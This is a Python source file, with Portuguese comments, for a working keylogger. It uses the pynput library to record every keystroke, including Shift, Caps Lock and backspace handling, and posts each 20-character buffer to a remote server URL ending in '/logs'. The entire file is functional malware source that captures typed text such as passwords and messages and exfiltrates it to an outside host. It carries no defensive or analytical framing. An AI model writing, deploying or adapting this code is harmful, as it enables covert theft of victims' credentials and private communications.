import requests
from pynput import keyboard

SERVER_URL = 'https://keylogger-wl3a.onrender.com/logs'

buffer = ''
caps_lock_on = False
pressed_keys = set()
backspace_count = 0

def send_buffer(data):
    try:
        requests.post(SERVER_URL, data={'log': data})
    except Exception as e:
        print(f"Erro ao enviar dados: {e}")

def on_press(key):
    global buffer, caps_lock_on, pressed_keys, backspace_count

    # Caps Lock deve ser processado sempre
    if key == keyboard.Key.caps_lock:
        caps_lock_on = not caps_lock_on
        buffer += '[CapsLock ON]' if caps_lock_on else '[CapsLock OFF]'
        return

    # Ignora teclas já pressionadas para evitar repetições
    if key in pressed_keys:
        return
    pressed_keys.add(key)

    try:
        if hasattr(key, 'char') and key.char:
            char = key.char.lower()
            shift_pressed = keyboard.Key.shift in pressed_keys or keyboard.Key.shift_r in pressed_keys

            # Aplica regra: Caps XOR Shift
            if char.isalpha() and (caps_lock_on ^ shift_pressed):
                char = char.upper()

            buffer += char
        else:
            if key == keyboard.Key.space:
                buffer += ' '
            elif key == keyboard.Key.enter:
                buffer += '\n'
            elif key == keyboard.Key.backspace:
                backspace_count += 1
                buffer += f'[Backspace {backspace_count}]'
            else:
                buffer += f'[{key.name}]'
    except Exception as e:
        buffer += f'[Erro: {e}]'

    if len(buffer) >= 20:
        send_buffer(buffer)
        buffer = ''

def on_release(key):
    global pressed_keys
    if key in pressed_keys:
        pressed_keys.remove(key)
    if key == keyboard.Key.esc:
        print("Keylogger parado com ESC.")
        return False

if __name__ == "__main__":
    print("Keylogger a correr... Pressiona ESC para parar.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
